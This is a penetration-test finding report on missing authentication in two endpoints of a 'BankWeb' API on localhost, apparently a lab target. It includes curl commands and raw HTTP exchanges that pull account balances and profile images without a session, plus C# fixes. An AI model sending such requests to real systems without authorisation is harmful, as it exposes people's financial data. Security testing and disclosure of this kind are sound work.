# Issue #14 — Authentication Bypass in User API Endpoints

| Field         | Details                                               |
|---------------|-------------------------------------------------------|
| **Target**    | BankWeb API — `http://localhost:1337/api/User/`       |
| **Severity**  | High                                                  |
| **CVSS v3.1** | 7.5                                                   |
| **Vector**    | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                  |
| **Category**  | Broken Access Control — Missing Authentication         |

---

## Summary

Two user-facing API endpoints lack any authentication requirement, allowing unauthenticated requests to retrieve sensitive data for arbitrary user accounts by supplying a known or guessable `user` parameter. The affected endpoints are:

- `GET /api/User/GetAvailableFunds` — returns the account balance for any specified user
- `GET /api/User/ProfileImage` — returns the profile image for any specified user

In a banking context, exposing account balance information to unauthenticated callers is a direct violation of financial data confidentiality. Both endpoints accept a `user` parameter that takes an email address — a format that is easily enumerable — meaning any user's balance can be queried by anyone with network access to the application.

Note: the `/api/User/ProfileImage` endpoint is also affected by path traversal (Issue #11), and its missing authentication further compounds that finding by removing the requirement for any session to exploit the traversal.

---

## Steps to Reproduce

### Vector A — Account Balance Disclosure

1. Without establishing any session, send the following request directly:

   ```bash
   curl -s "http://localhost:1337/api/User/GetAvailableFunds?user=[REDACTED]"
   ```

2. Observe that the server returns the account balance for the specified user with HTTP 200, despite no `Cookie` or `Authorization` header being present.

### Vector B — Profile Image Retrieval

1. Without establishing any session, send the following request:

   ```bash
   curl -s "http://localhost:1337/api/User/ProfileImage?user=[REDACTED]" \
     --output profile.png
   ```

2. Observe that the server returns the user's profile image with HTTP 200, without requiring any authentication.

---

## Proof of Concept

### Vector A — `GetAvailableFunds` (Authenticated Baseline)

**Request:**

```http
GET /api/User/GetAvailableFunds?user=[REDACTED] HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Referer: http://localhost:1337/
Cookie: SessionId=[REDACTED]
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Mon, 07 Jul 2025 15:41:51 GMT
Server: Kestrel
Content-Length: 14

{"balance":99}
```

---

### Vector A — `GetAvailableFunds` (Unauthenticated)

**Request:**

```http
GET /api/User/GetAvailableFunds?user=[REDACTED] HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Referer: http://localhost:1337/
```

No `Cookie` header is present.

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Mon, 07 Jul 2025 15:42:50 GMT
Server: Kestrel
Content-Length: 14

{"balance":99}
```

The response is identical to the authenticated request — the server performs no session validation before serving the account balance.

---

### Vector B — `ProfileImage` (Unauthenticated)

**Request:**

```http
GET /api/User/ProfileImage?user=[REDACTED] HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Referer: http://localhost:1337/Transaction
```

No `Cookie` header is present.

**Response:**

```http
HTTP/1.1 200 OK
Content-Length: 939071
Content-Type: image/jpg
Date: Mon, 07 Jul 2025 15:47:04 GMT
Server: Kestrel

PNG
...
```

The profile image is returned without any authentication check.

---

## Impact

- **Unauthenticated financial data exposure** — any anonymous internet user can query the account balance of any registered user by supplying their email address. In a production banking environment this constitutes a serious breach of financial privacy and likely violates applicable data protection regulations.
- **Mass account enumeration** — user email addresses extracted via the SQL injection (Issue #08) can be fed directly into this endpoint to enumerate balances across the entire user base without requiring any credentials.
- **Path traversal amplified** — as established in Issue #11, `/api/User/ProfileImage` is vulnerable to directory traversal. The absence of authentication on this endpoint means the traversal — and the arbitrary file read it enables — is exploitable by fully anonymous attackers, elevating the effective severity of that finding from High to Critical.
- **SSRF amplified** — similarly, the SSRF chain in Issue #12 relies on the `POST /api/User/ProfileImage` endpoint for the exfiltration stage via a `GET` to the same endpoint. Unauthenticated access removes the only barrier that might have limited that chain to authenticated attackers.
- **Broken access control at the architecture level** — the fact that two separate endpoints on the same controller share this flaw suggests that authentication enforcement is absent at the controller or middleware level, rather than being a one-off oversight. A broader audit of all API endpoints is warranted.

---

## Recommended Mitigations

1. **Enforce authentication on all `/api/User/*` endpoints** using the `[Authorize]` attribute at the controller level, ensuring all routes inherit the requirement by default:

   ```csharp
   [ApiController]
   [Route("api/[controller]")]
   [Authorize]  // Applied to all actions in this controller
   public class UserController : ControllerBase
   {
       ...
   }
   ```

2. **Enforce ownership — authenticated users should only be able to query their own data.** The `user` parameter should be ignored entirely and replaced with the identity derived from the validated session token:

   ```csharp
   [HttpGet("GetAvailableFunds")]
   [Authorize]
   public IActionResult GetAvailableFunds()
   {
       // Derive the user from the session — never from a query parameter
       var username = User.Identity.Name;
       var balance = _userService.GetBalance(username);
       return Ok(new { balance });
   }
   ```

3. **Conduct a full authentication audit across all API controllers.** Apply a framework-level authentication middleware that requires a valid session by default, with explicit `[AllowAnonymous]` annotations only on endpoints that genuinely require public access (e.g. login, registration):

   ```csharp
   // In Program.cs — require auth globally
   builder.Services.AddAuthorization(options =>
   {
       options.FallbackPolicy = new AuthorizationPolicyBuilder()
           .RequireAuthenticatedUser()
           .Build();
   });
   ```